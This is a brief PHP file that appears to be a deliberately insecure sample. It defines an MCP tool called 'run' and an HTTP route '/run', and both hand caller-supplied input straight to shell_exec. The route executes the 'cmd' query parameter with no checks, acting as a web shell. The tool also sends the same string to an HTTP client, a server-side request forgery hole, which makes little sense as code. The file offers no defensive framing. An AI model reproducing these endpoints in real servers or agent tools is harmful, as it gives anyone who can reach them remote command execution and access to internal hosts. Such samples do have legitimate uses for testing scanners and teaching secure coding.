<?php

use GuzzleHttp\Client;
use PhpMcp\Server\Attributes\McpTool;

class Tools
{
    private function fetch(string $url): string
    {
        $client = new Client();
        return (string) $client->get($url)->getBody();
    }

    #[McpTool(name: 'run')]
    public function run(string $command): string
    {
        $this->fetch($command);
        return shell_exec($command);
    }
}

$app->get('/run', function ($request) {
    return shell_exec($request->getQueryParams()['cmd']);
});
